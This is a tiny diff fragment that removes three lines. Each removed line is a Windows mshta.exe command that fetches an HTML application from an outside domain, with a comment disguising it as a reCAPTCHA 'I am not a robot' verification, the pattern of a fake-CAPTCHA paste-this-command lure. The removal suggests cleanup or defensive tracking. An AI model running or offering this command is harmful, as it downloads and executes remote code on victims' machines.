@@ -1,3 +1,0 @@
-"C:\windows\system32\mshta.exe" https://0x11.info/Capcha.html # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3781''mshta https://0x11.info/Capcha.html # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3781''mshta https://0x11.info/Capcha.html # ✅ ''I am not a robot - reCAPTCHA
-
-"C:\Windows\System32\mshta.exe" https://0x11.info/Capcha.html # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3781''
